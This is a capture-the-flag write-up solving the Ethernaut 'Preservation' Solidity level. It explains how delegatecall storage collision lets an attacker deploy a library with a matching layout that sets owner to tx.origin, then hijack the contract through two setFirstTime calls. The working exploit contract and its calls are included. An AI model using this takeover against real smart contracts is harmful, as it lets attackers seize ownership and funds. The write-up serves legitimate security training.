[16 - Preservation](https://ethernaut.openzeppelin.com/level/0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC)

Solution: 
* Preservation contract uses delegatecall, which means the calls keep Preservation's context
```
address public timeZone1Library;
address public timeZone2Library;
address public owner; 
uint storedTime;
```
* we need to find a way to change slot 2 of the Preservation contract (address has 20 bytes and can't fit two in the same slot => owner is on slot 2)
* when we call setFirstTime or setSecondTime, it will change the first slot in the library contract, but because of delegate call, it will actually change the first slot in the Preservation contract
* deploy a third library contract, with the same storage layout as Preservation (address, address, address). It will live at address X
* call Preservation.setFirstTime(<the uint256 equivalent of X>), which will change the first library's address in Preservation
* calling Preservation.setFirstTime will now call the third library, where we will have ownership change implemented

* deployed PreservationSolve at 0xEb27dc83C7440b060A62Aa33caD48E14eBa4e4e5
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simple library contract to set the time
contract PreservationSolve {
  address public doesntMatter1;
  address public doesntMatter2;
  address public owner; 

  function setTime(uint) public {
    owner = tx.origin;
  }
}
```
* await contract.setFirstTime("0x000000000000000000000000Eb27dc83C7440b060A62Aa33caD48E14eBa4e4e5"); to change library address 
* await contract.setFirstTime("0x000000000000000000000000Eb27dc83C7440b060A62Aa33caD48E14eBa4e4e5"); again to change owner